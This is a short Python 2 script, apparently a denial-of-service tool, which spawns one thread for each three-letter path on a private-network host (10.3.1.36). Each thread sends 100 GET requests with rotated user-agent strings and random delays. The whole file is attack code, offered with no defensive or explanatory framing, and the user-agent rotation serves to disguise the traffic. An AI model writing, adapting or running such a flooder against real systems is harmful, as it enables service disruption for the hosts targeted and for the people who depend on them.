import itertools
import requests
import random
import thread
import string
import time
import re

arq = open("user_agent.txt").read()
cabecalhos = re.findall(' *?(Mozilla.*)', arq)
tam = len(cabecalhos)
delays = [0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.8, 0.9]
palavras = itertools.product(string.letters, repeat=3)

def dos(url, delay, cabecalho):
   cont = 0
   while cont < 100:
      time.sleep(delay)
      cabecalho = {
         'User-Agent': cabecalho
      }
      r = requests.get(url, headers=cabecalho)
      print url, r.status_code
      cont+=1

contador = 0
try:
   while palavras:
      url = "http://10.3.1.36/"+"".join(palavras.next())
      thread.start_new_thread(dos, (url, delays[random.randint(0, 8)], cabecalhos[random.randint(0, tam)]))
      contador+=1
except:
   print  'ERRORROROR', contador

while 1:
   pass
